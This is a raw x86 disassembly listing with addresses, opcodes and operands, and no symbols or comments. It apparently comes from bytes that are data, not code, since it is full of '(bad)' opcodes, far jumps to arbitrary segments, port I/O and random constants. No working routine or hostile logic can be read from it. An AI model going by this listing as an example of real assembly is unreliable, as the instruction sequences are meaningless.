  486a51:	add    BYTE PTR [ebx-0x41],cl
  486a54:	inc    ebx
  486a55:	pop    eax
  486a56:	(bad)  
  486a57:	(bad)  
  486a58:	add    DWORD PTR [edi+0xb75394f],esi
  486a5e:	stos   BYTE PTR es:[edi],al
  486a5f:	mov    DWORD PTR [edi+0x36],ebx
  486a62:	lahf   
  486a63:	xchg   BYTE PTR [ecx+0xd],ah
  486a66:	add    al,0xae
  486a68:	jmp    0x486a89
  486a6a:	daa    
  486a6b:	sbb    eax,0xcbb7752b
  486a70:	addr16 pusha 
  486a72:	push   0x21
  486a74:	xchg   BYTE PTR [edi],dh
  486a76:	das    
  486a77:	xor    al,0x95
  486a79:	push   edx
  486a7a:	fsubr  DWORD PTR [ebp+0x2f]
  486a7d:	xlat   BYTE PTR ds:[ebx]
  486a7e:	cmp    BYTE PTR [esi+ecx*2-0x3869d845],ah
  486a85:	mov    al,0x62
  486a87:	push   0x4d
  486a89:	pop    DWORD PTR [edi+0x13528a94]
  486a8f:	aas    
  486a90:	lahf   
  486a91:	add    esp,esp
  486a93:	and    bl,0x92
  486a96:	out    0x30,eax
  486a98:	retf   0x1898
  486a9b:	add    BYTE PTR [ebx+0x47],0x41
  486a9f:	and    BYTE PTR ds:0xa70be08b,bl
  486aa5:	pop    ds
  486aa6:	repz dec edx
  486aa8:	and    esp,DWORD PTR [esi]
  486aaa:	inc    edi
  486aab:	fild   WORD PTR [ecx+0x6f]
  486aae:	sub    al,0x98
  486ab0:	add    BYTE PTR [edi-0x55],al
  486ab3:	push   edx
  486ab4:	xchg   edx,eax
  486ab5:	dec    esi
  486ab6:	shl    BYTE PTR [edi],0x47
  486ab9:	cmp    BYTE PTR ds:0x57eb51a3,bl
  486abf:	pop    ds
  486ac0:	pop    ds
  486ac1:	mov    cl,0x2a
  486ac3:	sbb    DWORD PTR [ebx+0x16],0xab0baa97
  486aca:	add    BYTE PTR [edi+0x312b161f],0xe3
  486ad1:	cmp    DWORD PTR [edi+0x521717c7],eax
  486ad7:	sub    bh,BYTE PTR [edi-0x5a2ec835]
  486add:	inc    edx
  486ade:	adc    esi,DWORD PTR [edi-0x63a7c6a1]
  486ae4:	inc    eax
  486ae5:	call   0x61a5:0x99756767
  486aec:	jg     0x486b30
  486aee:	repz mov fs,WORD PTR [ebx-0x16]
  486af2:	rcr    BYTE PTR [edx-0x59ceb8a1],1
  486af8:	inc    eax
  486af9:	pop    eax
  486afa:	mov    al,0x2f
  486afc:	mov    edi,0x841331cf
  486b01:	push   ebp
  486b02:	mov    es:0x235c3537,eax
  486b08:	adc    bh,BYTE PTR [edi+0x15695f38]
  486b0e:	jmp    0x486a91
  486b10:	ss pop ds
  486b12:	adc    DWORD PTR [eax-0x5b],ebx
  486b15:	arpl   WORD PTR [edi+0x48575ac7],bx
  486b1b:	scas   al,BYTE PTR es:[edi]
  486b1c:	dec    edi
  486b1d:	xor    DWORD PTR [ebx+0x51b50356],esi
  486b23:	out    0x2f,eax
  486b25:	mov    al,0x92
  486b27:	out    0x38,eax
  486b29:	push   DWORD PTR [ecx]
  486b2b:	cmp    BYTE PTR [eax-0x28d89ff0],al
  486b31:	aaa    
  486b32:	cmp    eax,DWORD PTR [ebp+0x3347d75d]
  486b38:	idiv   ebx
  486b3a:	sar    DWORD PTR [ecx+0x3f5e1ed1],0x9f
  486b41:	into   
  486b42:	xchg   esp,ebx
  486b44:	inc    eax
  486b45:	sbb    al,BYTE PTR [esi+0xf]
  486b48:	dec    edi
  486b49:	add    eax,0x971812a3
  486b4e:	pop    ds
  486b4f:	push   ss
  486b50:	xchg   BYTE PTR [eax+eax*4-0x29],bl
  486b54:	xor    bl,BYTE PTR [edx]
  486b56:	test   BYTE PTR [esp+edi*4+0x264f384f],al
  486b5d:	adc    eax,DWORD PTR [esp+eiz*8+0x5a322f34]
  486b64:	ror    BYTE PTR [ebx],cl
  486b66:	or     eax,DWORD PTR [edi]
  486b68:	pop    es
  486b69:	inc    ebx
  486b6a:	outs   dx,DWORD PTR ds:[esi]
  486b6b:	push   ebp
  486b6c:	pusha  
  486b6d:	dec    ebp
  486b6e:	addr16 das 
  486b70:	pop    es
  486b71:	xchg   ebp,eax
  486b72:	adc    BYTE PTR [ecx+0x5e46675b],bh
  486b78:	fwait
  486b79:	je     0x486b21
  486b7b:	mov    ?,WORD PTR [edi+0x43]
  486b7e:	daa    
  486b7f:	mov    al,0x60
  486b81:	push   ebp
  486b82:	add    ah,BYTE PTR [edi+0x5bc71207]
  486b88:	jne    0x486b51
  486b8a:	outs   dx,DWORD PTR ds:[esi]
  486b8b:	iret   
  486b8c:	mov    edi,0xb5d46be4
  486b91:	out    0x3f,eax
  486b93:	cmp    DWORD PTR [eax],eax
  486b95:	ss sbb eax,0xc78462b0
  486b9b:	bound  esp,QWORD PTR [ebp+0x35]
  486b9e:	fsubr  DWORD PTR [edi]
  486ba0:	das    
  486ba1:	inc    esi
  486ba2:	das    
  486ba3:	imul   esi,DWORD PTR [ecx],0xffffff81
  486ba6:	push   ebp
  486ba7:	jo     0x486ba0
  486ba9:	pop    es
  486baa:	stos   DWORD PTR es:[edi],eax
  486bab:	push   ecx
  486bac:	je     0x486bde
  486bae:	imul   edx,DWORD PTR [edi],0x44
  486bb1:	push   edi
  486bb2:	or     bl,ah
  486bb4:	or     al,BYTE PTR [edi+ecx*4+0x111b2f93]
  486bbb:	in     al,dx
  486bbc:	ror    BYTE PTR [edi+0x7801a737],0xc
  486bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486bc4:	xor    al,0x7e
  486bc6:	xchg   esi,eax
  486bc7:	pop    esp
  486bc8:	test   eax,0x31bf3f14
  486bcd:	ins    DWORD PTR es:[edi],dx
  486bce:	adc    dh,BYTE PTR [ecx+0x8cba71a]
  486bd4:	push   ebp
  486bd5:	xchg   ebx,eax
  486bd6:	sub    DWORD PTR [edi-0x6cfab0bd],0x347610e6
  486be0:	inc    ebp
  486be1:	addr16 sub al,0x62
  486be4:	test   DWORD PTR [edx-0x6694e0d9],eax
  486bea:	fadd   DWORD PTR [esi]
  486bec:	pop    es
  486bed:	out    dx,eax
  486bee:	cmp    BYTE PTR [esi+ebp*2-0xa01d54],dh
  486bf5:	out    0x5c,eax
  486bf7:	push   edx
  486bf8:	mov    ds:0xcf8f1669,eax
  486bfd:	dec    ebx
  486bfe:	jb     0x486c11
  486c00:	jb     0x486ba9
  486c02:	push   edi
  486c03:	xor    al,bh
  486c05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486c06:	sub    edx,DWORD PTR [edx+eiz*2]
  486c09:	xchg   esi,esi
  486c0b:	xor    BYTE PTR [esi+edx*2],cl
  486c0e:	add    DWORD PTR [edi+ebp*8+0x184ed13e],ecx
  486c15:	xor    al,0x4f
  486c17:	sahf   
  486c18:	jg     0x486c3f
  486c1a:	add    BYTE PTR [ecx+0x31],0x46
  486c1e:	push   edi
  486c1f:	outs   dx,DWORD PTR ds:[esi]
  486c20:	sub    BYTE PTR [ecx+0x7f9358c9],dh
  486c26:	dec    edx
  486c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486c28:	add    DWORD PTR [eax+0xddf4738],edi
  486c2e:	cmp    ah,BYTE PTR [edx]
  486c30:	mov    WORD PTR [edi+0x32],ss
  486c33:	pop    es
  486c34:	dec    esp
  486c35:	add    al,0x4f
  486c37:	or     BYTE PTR [edi],bh
  486c39:	jg     0x486c7f
  486c3b:	mov    edx,0xdf806871
  486c40:	into   
  486c41:	inc    ebp
  486c42:	mov    al,0x8
  486c44:	pop    edi
  486c45:	fist   WORD PTR [edi+0xf]
  486c48:	add    ch,BYTE PTR [ebx+0x3f32c101]
  486c4e:	pop    ds
  486c4f:	aas    
  486c50:	out    dx,al
  486c51:	or     al,0xed
  486c53:	lods   eax,DWORD PTR ds:[esi]
  486c54:	aaa    
  486c55:	das    
  486c56:	inc    ebx
  486c57:	adc    bl,BYTE PTR [ebp+0x27]
  486c5a:	adc    cl,0x2f
  486c5d:	ja     0x486c91
  486c5f:	(bad)
  486c62:	arpl   WORD PTR [edi-0x5f18f8bd],ax
  486c68:	rcl    BYTE PTR [edi],1
  486c6a:	push   esi
  486c6b:	sbb    ecx,DWORD PTR [edi-0x4fc2d1d4]
  486c71:	es out 0x0,eax
  486c74:	mov    WORD PTR [eax],?
  486c76:	ss out 0xe7,eax
  486c79:	es popa 
  486c7b:	(bad)  
  486c7c:	mov    bh,BYTE PTR [edi]
  486c7e:	imul   edi,DWORD PTR [ebx+0x6d1ab545],0x38
  486c85:	(bad)  
  486c86:	jle    0x486c9b
  486c88:	push   es
  486c89:	mov    ds:0xbf83a0f0,eax
  486c8e:	sbb    eax,0x17012b1c
  486c93:	mov    bh,0xe3
  486c95:	push   edx
  486c96:	mov    bl,0x8e
  486c98:	in     al,0x96
  486c9a:	inc    ebx
  486c9b:	xor    esp,DWORD PTR [edi]
  486c9d:	jno    0x486c3f
  486c9f:	inc    ebp
  486ca0:	adc    eax,0x48993727
  486ca5:	pop    ebx
  486ca6:	add    DWORD PTR [edi],edi
  486ca8:	xchg   DWORD PTR [ebp+0x671c66d2],ebp
  486cae:	pop    es
  486caf:	jmp    FWORD PTR [ebx-0x5c1e1253]
  486cb5:	push   edi
  486cb6:	aaa    
  486cb7:	imul   DWORD PTR [esi+0xa]
  486cba:	out    dx,eax
  486cbb:	jl     0x486cdc
  486cbd:	ss pop ss
  486cbf:	jg     0x486c5a
  486cc1:	nop
  486cc2:	inc    ebx
  486cc3:	and    eax,0xc9313206
  486cc8:	pop    es
  486cc9:	jbe    0x486d13
  486ccb:	xlat   BYTE PTR ds:[ebx]
  486ccc:	cs ss sbb eax,0x4f4b34d8
  486cd3:	cmp    DWORD PTR [edi],esp
  486cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486cd6:	lds    eax,FWORD PTR [ecx+0x5f666edc]
  486cdc:	cmp    BYTE PTR ds:0x2ab6242f,dh
  486ce2:	pusha  
  486ce3:	outs   dx,DWORD PTR ds:[esi]
  486ce4:	aas    
  486ce5:	lods   eax,DWORD PTR ds:[esi]
  486ce6:	and    al,0xb2
  486ce8:	and    esi,edi
  486cea:	lahf   
  486ceb:	das    
  486cec:	mov    ecx,0xe7b50ab6
  486cf1:	movntq QWORD PTR [edx],mm6
  486cf4:	test   al,0x55
  486cf6:	cmp    DWORD PTR [edi+ecx*4],ebp
  486cf9:	inc    edi
  486cfa:	dec    esi
  486cfb:	pusha  
  486cfc:	xor    edx,DWORD PTR [esi+0x7]
  486cff:	jg     0x486c98
  486d01:	repnz push eax
  486d03:	fdiv   DWORD PTR [ecx-0x58cc5859]
  486d09:	pushf  
  486d0a:	add    dl,BYTE PTR [esi-0x3d]
  486d0d:	outs   dx,DWORD PTR ds:[esi]
  486d0e:	adc    DWORD PTR [esi],ebp
  486d10:	inc    ebp
  486d11:	test   eax,0x3ef26af
  486d16:	mov    ah,0x86
  486d18:	push   ebp
  486d19:	aas    
  486d1a:	aaa    
  486d1b:	sbb    BYTE PTR [ecx+0x34df5882],bh
  486d21:	xor    DWORD PTR [ebx-0x59],edx
  486d24:	or     ecx,DWORD PTR ds:0xb4357fef
  486d2a:	mov    BYTE PTR [ebx-0x75],dl
  486d2d:	aaa    
  486d2e:	pop    es
  486d2f:	call   0xcff7:0xa7d0a546
  486d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486d37:	jb     0x486d40
  486d39:	nop
  486d3a:	div    DWORD PTR [ecx+eax*2]
  486d3d:	dec    esi
  486d3e:	lods   eax,DWORD PTR ds:[esi]
  486d3f:	or     ah,BYTE PTR [ecx]
  486d41:	pop    ds
  486d42:	pop    ss
  486d43:	outs   dx,BYTE PTR ds:[esi]
  486d44:	(bad)  
  486d46:	mov    dl,BYTE PTR [edi-0x49]
  486d49:	mov    ebp,DWORD PTR [edx-0x7d]
  486d4c:	cmp    DWORD PTR es:[edi-0x2b4eded9],ecx
  486d53:	mov    DWORD PTR [ecx-0x69],eax
  486d56:	pop    edi
  486d57:	sbb    BYTE PTR [esi],ch
  486d59:	mov    edx,0x97368f6e
  486d5e:	inc    ebx
  486d5f:	daa    
  486d60:	push   edi
  486d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  486d62:	adc    BYTE PTR [edi+eax*1],ch
  486d65:	xchg   DWORD PTR [eax],edi
  486d67:	push   esi
  486d68:	mov    BYTE PTR [ebx],ah
  486d6a:	and    DWORD PTR [edi-0x55],eax
  486d6d:	mov    cl,0x9
  486d6f:	xchg   DWORD PTR [edi],eax
  486d71:	(bad)  
  486d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486d73:	stos   BYTE PTR es:[edi],al
  486d74:	mov    DWORD PTR [esp+ebx*1+0x57],edx
  486d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486d79:	mov    cl,0xdc
  486d7b:	or     al,0xb7
  486d7d:	idiv   DWORD PTR [edi-0x2f54b5cd]
  486d83:	mov    ah,BYTE PTR [edi+0x231201af]
  486d89:	mov    cl,0xc7
  486d8b:	xchg   DWORD PTR [edi-0x7f],esi
  486d8e:	add    al,0x93
  486d90:	xor    BYTE PTR [edi],dh
  486d92:	out    dx,eax
  486d93:	(bad)  
  486d94:	dec    edx
  486d95:	popa   
  486d96:	xchg   ebp,eax
  486d97:	jnp    0x486d58
  486d99:	js     0x486e13
  486d9b:	add    DWORD PTR [eax+0x96bb7ef],0x21
  486da2:	in     al,0x9
  486da4:	push   ss
  486da5:	xor    eax,0x831601ee
  486daa:	div    DWORD PTR [edi+0x6b]
  486dad:	push   edx
  486dae:	dec    ecx
  486daf:	outs   dx,DWORD PTR ds:[esi]
  486db0:	mov    ecx,0x83371fa8
  486db5:	and    al,0x16
  486db7:	loopne 0x486d66
  486db9:	aas    
  486dba:	pop    es
  486dbb:	pop    ss
  486dbc:	xchg   edi,eax
  486dbd:	inc    esi
  486dbe:	add    ch,BYTE PTR [ebx+0x7f]
  486dc1:	pop    ebx
  486dc2:	lahf   
  486dc3:	and    eax,0x17058adc
  486dc8:	xor    cl,BYTE PTR [edi]
  486dca:	mov    ecx,DWORD PTR [ecx+0x1f17c744]
  486dd0:	push   eax
  486dd1:	pop    eax
  486dd2:	mov    cl,0x1a
  486dd4:	ja     0x486db5
  486dd6:	and    dl,BYTE PTR [eax+0x42]
  486dd9:	scas   al,BYTE PTR es:[edi]
  486dda:	pop    ds
  486ddb:	xor    BYTE PTR [edi],al
  486ddd:	mov    eax,ds:0x57c090ad
  486de2:	out    dx,eax
  486de3:	or     BYTE PTR [ebx],bl
  486de5:	push   esi
  486de6:	jnp    0x486e07
  486de8:	out    dx,eax
  486de9:	push   edi
  486dea:	push   ss
  486deb:	imul   esi,DWORD PTR [ecx],0x4757877c
  486df1:	pusha  
  486df2:	cmp    al,0x1
  486df4:	or     esi,edi
  486df6:	xlat   BYTE PTR ds:[ebx]
  486df7:	arpl   WORD PTR [ecx],si
  486df9:	and    ebp,eax
  486dfb:	mov    edi,0x69b6836f
  486e00:	adc    DWORD PTR [edi],ebx
  486e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486e03:	out    0x3,eax
  486e05:	fisttp DWORD PTR [eax+0x2fef9a76]
  486e0b:	inc    edi
  486e0c:	mov    dh,BYTE PTR [ecx-0x2c10009a]
  486e12:	pop    eax
  486e13:	and    eax,0x3827c107
  486e18:	rol    DWORD PTR [esi+0x6a],1
  486e1b:	lea    ebx,[edi-0x7d73d0cd]
  486e21:	push   ebp
  486e22:	outs   dx,DWORD PTR ds:[esi]
  486e23:	xor    eax,DWORD PTR [edi-0x4f973b29]
  486e29:	adc    eax,0xb1964f07
  486e2e:	pop    ebx
  486e2f:	pop    eax
  486e30:	test   edi,ebx
  486e32:	aas    
  486e33:	repnz adc DWORD PTR [edi+edx*8],eax
  486e37:	push   DWORD PTR [ebx]
  486e39:	daa    
  486e3a:	cmp    DWORD PTR [eax],eax
  486e3c:	inc    esp
  486e3d:	push   ebp
  486e3e:	mov    DWORD PTR [eax+0x77444f11],0x18a8402d
  486e48:	das    
  486e49:	jg     0x486e91
  486e4b:	jge    0x486ead
  486e4d:	je     0x486dd6
  486e4f:	(bad)  
  486e50:	imul   DWORD PTR [ebx-0x825bfe3]
  486e56:	dec    edi
  486e57:	into   
  486e58:	xor    DWORD PTR [eax],ecx
  486e5a:	push   ecx
  486e5b:	adc    ch,bh
  486e5d:	es push esi
  486e5f:	adc    DWORD PTR [edi+0x4fdf9f38],0x2278d709
  486e69:	aaa    
  486e6a:	aaa    
  486e6b:	in     al,0x6a
  486e6d:	mov    ebp,0xc7875f55
  486e72:	xor    ah,BYTE PTR [edi+0x13]
  486e75:	jmp    0x486eb7
  486e77:	addr16 out 0xd4,eax
  486e7a:	sbb    dh,cl
  486e7c:	test   edi,esi
  486e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486e7f:	cs pusha 
  486e81:	shr    edx,0x27
  486e84:	pop    es
  486e85:	(bad)  
  486e86:	xor    dl,al
  486e88:	xchg   BYTE PTR [ecx+0x4d5a7f37],ah
  486e8e:	mov    edx,0x3fef0a44
  486e93:	sbb    ebx,DWORD PTR [ebx-0x40]
  486e96:	shl    BYTE PTR gs:[edx],0x57
  486e9a:	or     cl,0xe5
  486e9d:	sub    cl,0x23
  486ea0:	das    
  486ea1:	inc    esp
  486ea2:	cmp    cl,ah
  486ea4:	push   eax
  486ea5:	sub    ebx,DWORD PTR [eax-0x69]
  486ea8:	add    ebx,edx
  486eaa:	dec    esp
  486eab:	bound  esi,QWORD PTR [ebp-0x9]
  486eae:	fild   QWORD PTR [ebp-0x8eab793]
  486eb4:	push   edi
  486eb5:	dec    edi
  486eb6:	or     DWORD PTR [edi-0x789432a6],ebx
  486ebc:	pop    ds
  486ebd:	mov    dl,cl
  486ebf:	inc    eax
  486ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486ec1:	mov    edi,0x4210073f
  486ec6:	or     dh,BYTE PTR ds:0x6b5035ce
  486ecc:	mov    ecx,0x6f2b6f9e
  486ed1:	stos   DWORD PTR es:[edi],eax
  486ed2:	mov    al,0xf6
  486ed4:	mov    ah,0xb7
  486ed6:	mov    bh,0x97
  486ed8:	out    0xac,eax
  486eda:	dec    eax
  486edb:	stos   DWORD PTR es:[edi],eax
  486edc:	dec    edx
  486edd:	inc    edi
  486ede:	out    0x25,eax
  486ee0:	push   edx
  486ee1:	test   BYTE PTR [ebx-0x69],ah
  486ee4:	inc    edi
  486ee5:	daa    
  486ee6:	lods   eax,DWORD PTR ds:[esi]
  486ee7:	pusha  
  486ee8:	add    al,0x16
  486eea:	dec    edi
  486eeb:	push   0x77a51847
  486ef0:	push   0xffffffaf
  486ef2:	test   DWORD PTR [edx+0x3fc40d5b],0x7be4b91f
  486efc:	cli    
  486efd:	daa    
  486efe:	sub    edx,DWORD PTR [edi]
  486f00:	xor    eax,DWORD PTR [ebp+0x5d]
  486f03:	clc    
  486f04:	enter  0x2f34,0x77
  486f08:	ja     0x486e8a
  486f0a:	xor    dl,BYTE PTR [ecx+0x61]
  486f0d:	mov    edi,0x1c835538
  486f12:	or     eax,0x933642e7
  486f17:	loope  0x486f4d
  486f19:	cmp    al,BYTE PTR [ebp+0x4d6d2e0f]
  486f1f:	test   BYTE PTR [esi+0xf],al
  486f22:	outs   dx,DWORD PTR ss:[esi]
  486f24:	cmp    edi,DWORD PTR [eax+0x2378dc4]
  486f2a:	sbb    edi,DWORD PTR [edi]
  486f2c:	jo     0x486f36
  486f2e:	in     eax,dx
  486f2f:	pusha  
  486f30:	addr16 aas 
  486f32:	mov    esi,0x85434db8
  486f37:	daa    
  486f38:	inc    esi
  486f39:	scas   eax,DWORD PTR es:[edi]
  486f3a:	xlat   BYTE PTR ds:[ebx]
  486f3b:	pop    ebp
  486f3c:	test   al,0x4
  486f3e:	push   ss
  486f3f:	pop    es
  486f40:	ja     0x486f2d
  486f42:	inc    edx
  486f43:	or     al,BYTE PTR [edi]
  486f45:	(bad)  
  486f46:	pop    ebp
  486f47:	scas   eax,DWORD PTR es:[edi]
  486f48:	jp     0x486f19
  486f4a:	lods   al,BYTE PTR ds:[esi]
  486f4b:	cs loop 0x486f02
  486f4e:	pop    ss
  486f4f:	add    bh,BYTE PTR [edi]
  486f51:	mov    DWORD PTR [ebp-0x55fcfc46],eax
  486f57:	(bad)  
  486f58:	mov    edx,0x1f1a6501
  486f5d:	cmp    DWORD PTR [edi-0x4c],esi
  486f60:	add    ch,BYTE PTR [eax+edx*8-0x138eb895]
  486f67:	js     0x486f84
  486f69:	aas    
  486f6a:	mov    bl,0x37
  486f6c:	das    
  486f6d:	xor    DWORD PTR [ecx],0x8f35c2a2
  486f73:	push   ds
  486f74:	shl    BYTE PTR [ecx],0x12
  486f77:	dec    eax
  486f78:	inc    ebx
  486f79:	jnp    0x486f50
  486f7b:	les    ecx,FWORD PTR [edx]
  486f7d:	ins    DWORD PTR es:[edi],dx
  486f7e:	mov    edi,0x8e916f6f
  486f83:	inc    ebx
  486f84:	(bad)  
  486f85:	xlat   BYTE PTR ds:[ebx]
  486f86:	pop    ds
  486f87:	adc    BYTE PTR [ebx],bl
  486f89:	adc    BYTE PTR [ebp-0x59],0xa7
  486f8d:	cmc    
  486f8e:	inc    esi
  486f8f:	xor    DWORD PTR [ebp+0x3f],edx
  486f92:	xor    DWORD PTR [edi+0x316e04ef],esp
  486f98:	(bad)  [edi]
  486f9a:	ss aas 
  486f9c:	jbe    0x486fe0
  486f9e:	daa    
  486f9f:	mov    cl,0x6a
  486fa1:	fisttp WORD PTR [edi+0x12a365c5]
  486fa7:	aas    
  486fa8:	psrld  mm2,mm6
  486fab:	(bad)  
  486fac:	pop    esi
  486fad:	retf   
  486fae:	leave  
  486faf:	aaa    
  486fb0:	xor    dl,bh
  486fb2:	daa    
  486fb3:	cmp    BYTE PTR [edi],al
  486fb5:	shl    DWORD PTR ds:0xbf304327,1
  486fbb:	xor    BYTE PTR [ecx-0x58bb8dfb],ah
  486fc1:	xor    BYTE PTR [esi-0x707538aa],ch
  486fc7:	daa    
  486fc8:	fistp  DWORD PTR ds:0x273ac62b
  486fce:	push   edi
  486fcf:	mov    edi,0x1878e2b7
  486fd4:	adc    edx,DWORD PTR [edi+0x32]
  486fd7:	push   ecx
  486fd8:	or     esi,DWORD PTR [ecx]
  486fda:	js     0x486f73
  486fdc:	bound  esi,QWORD PTR [edi]
  486fde:	(bad)  
  486fdf:	and    eax,0x1607891d
  486fe4:	xor    DWORD PTR ss:[edi],ebp
  486fe7:	jne    0x487045
  486fe9:	aaa    
  486fea:	push   esi
  486feb:	inc    DWORD PTR [edx+0x47]
  486fee:	add    ecx,DWORD PTR [ecx]
  486ff0:	sub    BYTE PTR [ebp-0x29],0xf
  486ff4:	mov    WORD PTR [eax],ds
  486ff6:	fisubr WORD PTR [esi-0x5d]
  486ff9:	iret   
  486ffa:	iret   
  486ffb:	lods   eax,DWORD PTR ds:[esi]
  486ffc:	add    dl,dh
  486ffe:	or     eax,0xdd218fb7
  487003:	push   eax
  487004:	add    dh,BYTE PTR [edi-0x6]
  487007:	inc    esi
  487008:	add    eax,0x4131c681
  48700d:	aaa    
  48700e:	mov    edi,0xf2558d50
  487013:	cmp    BYTE PTR [eax],al
  487015:	inc    esp
  487016:	outs   dx,DWORD PTR ds:[esi]
  487017:	push   edx
  487018:	shr    DWORD PTR [edx],cl
  48701a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48701b:	mov    edi,0x11684a7
  487020:	cs mov bl,0xef
  487023:	adc    BYTE PTR [edx],al
  487025:	inc    edi
  487026:	cmp    ch,bh
  487028:	pop    es
  487029:	xchg   DWORD PTR [ecx-0x3d],ecx
  48702c:	sub    BYTE PTR [esi+0x7b],0x37
  487030:	daa    
  487031:	aaa    
  487032:	dec    eax
  487033:	sbb    DWORD PTR [ecx+ecx*4+0x37],0x6f
  487038:	jbe    0x486fe4
  48703a:	mov    al,0x26
  48703c:	lods   eax,DWORD PTR ds:[esi]
  48703d:	jg     0x48702e
  48703f:	daa    
  487040:	stos   BYTE PTR es:[edi],al
  487041:	rcl    BYTE PTR [edi],1
  487043:	mov    ah,0x1f
  487045:	xchg   edi,eax
  487046:	pushf  
  487047:	pop    ebx
  487048:	sbb    al,0x40
  48704a:	fild   QWORD PTR [edi]
  48704c:	mov    dh,0xac
  48704e:	push   0xffffff80
  487050:	or     dl,BYTE PTR [edi+0x6d293746]
  487056:	inc    eax
  487057:	pusha  
  487058:	daa    
  487059:	mov    DWORD PTR [eax],0xb77580ee
  48705f:	jmp    0xef6a:0x630ac202
  487066:	xor    eax,0x890d2b27
  48706b:	mov    ebx,eax
  48706d:	(bad)  
  48706e:	push   esi
  48706f:	test   BYTE PTR [edi-0x28ba81c4],dh
  487075:	lods   al,BYTE PTR ds:[si]
  487077:	imul   esi,DWORD PTR [ecx-0x6868d82a],0xec14ab1
  487081:	jmp    0x48707a
  487083:	adc    al,al
  487085:	nop
  487086:	or     DWORD PTR ds:0xd043b74e,0x16
  48708d:	dec    eax
  48708e:	js     0x487053
  487090:	xlat   BYTE PTR ds:[ebx]
  487091:	div    DWORD PTR ds:0xef814753
  487097:	xor    eax,0x8d75868f
  48709c:	xchg   bh,dl
  48709e:	xlat   BYTE PTR ds:[ebx]
  48709f:	iret   
  4870a0:	adc    al,0xf2
  4870a2:	inc    ebx
  4870a3:	stos   DWORD PTR es:[edi],eax
  4870a4:	das    
  4870a5:	inc    edx
  4870a6:	dec    eax
  4870a7:	shl    DWORD PTR ds:0x8af6f81,1
  4870ad:	jno    0x4870ba
  4870af:	sub    ebp,DWORD PTR [edi+0x2f]
  4870b2:	lods   al,BYTE PTR ds:[esi]
  4870b3:	sbb    ah,BYTE PTR [eax]
  4870b5:	ja     0x487096
  4870b7:	cmp    DWORD PTR [eax],eax
  4870b9:	aaa    
  4870ba:	inc    edi
  4870bb:	or     al,0x1a
  4870bd:	outs   dx,BYTE PTR ds:[esi]
  4870be:	xor    al,0xe7
  4870c0:	cs out 0xb,eax
  4870c3:	add    cl,BYTE PTR [eax+esi*2]
  4870c6:	out    0x30,eax
  4870c8:	inc    edi
  4870c9:	dec    eax
  4870ca:	aaa    
  4870cb:	sbb    al,BYTE PTR [esi]
  4870cd:	sahf   
  4870ce:	out    dx,eax
  4870cf:	or     ah,BYTE PTR [ebp-0x7a]
  4870d2:	inc    edx
  4870d3:	lods   al,BYTE PTR ds:[esi]
  4870d4:	mov    bh,0x67
  4870d6:	inc    edx
  4870d7:	adc    BYTE PTR [eax-0x3b],0xa
  4870db:	addr16 pop es
  4870dd:	shr    BYTE PTR [ebp+0x5fefab03],cl
  4870e3:	es pusha 
  4870e5:	adc    eax,0x6f7f2844
  4870ea:	and    DWORD PTR [edi],ebp
  4870ec:	cs (bad) 
  4870ee:	(bad)  
  4870ef:	xor    eax,DWORD PTR [edi+0x36]
  4870f2:	cwde   
  4870f3:	sub    dl,BYTE PTR [esi+0x343f431c]
  4870f9:	jo     0x48707e
  4870fb:	push   0x62271f4d
  487100:	pop    esp
  487101:	arpl   WORD PTR [ebx],ax
  487103:	(bad)  
  487104:	outs   dx,DWORD PTR ds:[esi]
  487105:	out    0x17,eax
  487107:	mov    ecx,DWORD PTR [edx+0x58]
  48710a:	sub    al,0x37
  48710c:	jg     0x487166
  48710e:	sbb    eax,0x876a121a
  487113:	mov    WORD PTR [ebx+0xf],ds
  487116:	jmp    0x487127
  487118:	sbb    DWORD PTR [edi+0x2e],0xc
  48711c:	(bad)  
  48711d:	or     DWORD PTR [edi],esp
  48711f:	and    bh,BYTE PTR [edi+0x22]
  487122:	inc    edx
  487123:	xor    eax,0xa55627b4
  487128:	stos   DWORD PTR es:[edi],eax
  487129:	popf   
  48712a:	pop    ss
  48712b:	pop    es
  48712c:	xchg   DWORD PTR [esi-0x5c],edx
  48712f:	dec    eax
  487130:	add    esi,0x5336f732
  487136:	stos   DWORD PTR es:[edi],eax
  487137:	xchg   edx,eax
  487138:	dec    edi
  487139:	addr16 push esi
  48713b:	add    BYTE PTR [eax+edx*4],ch
  48713e:	jmp    0x4870e3
  487140:	popa   
  487141:	sbb    eax,0x6f4f30c7
  487146:	fld    TBYTE PTR [esi]
  487148:	push   esi
  487149:	sub    bh,cl
  48714b:	sbb    ebp,DWORD PTR [edi-0x2f1dbe2a]
  487151:	stos   BYTE PTR es:[edi],al
  487152:	das    
  487153:	inc    edi
  487154:	push   edi
  487155:	jmp    0x48717f
  487157:	mov    eax,0x42570210
  48715c:	test   ebx,ebx
  48715e:	or     dl,BYTE PTR [edx-0x3d]
  487161:	push   edi
  487162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487163:	cmp    BYTE PTR [edx],al
  487165:	pop    edx
  487166:	mov    al,0xa
  487168:	jmp    FWORD PTR [edi+0x1581f11e]
  48716e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48716f:	out    dx,eax
  487170:	mov    es,WORD PTR [ebp-0x74]
  487173:	or     cl,BYTE PTR [esi+0x2f34874d]
  487179:	sub    ebx,DWORD PTR [eax+0x49]
  48717c:	cmp    BYTE PTR [ebx],al
  48717e:	pop    ds
  48717f:	push   edi
  487180:	and    eax,0x5b08c0b0
  487185:	push   edi
  487186:	(bad)  
  487187:	fsubrp st(4),st
  487189:	mov    eax,ds:0xe3384f42
  48718e:	imul   ebx,DWORD PTR [edx+0x25],0xffffffbd
  487192:	daa    
  487193:	xor    eax,DWORD PTR [edi+0x1bb68d67]
  487199:	iret   
  48719a:	test   DWORD PTR [edx+0x68],0x9f04086c
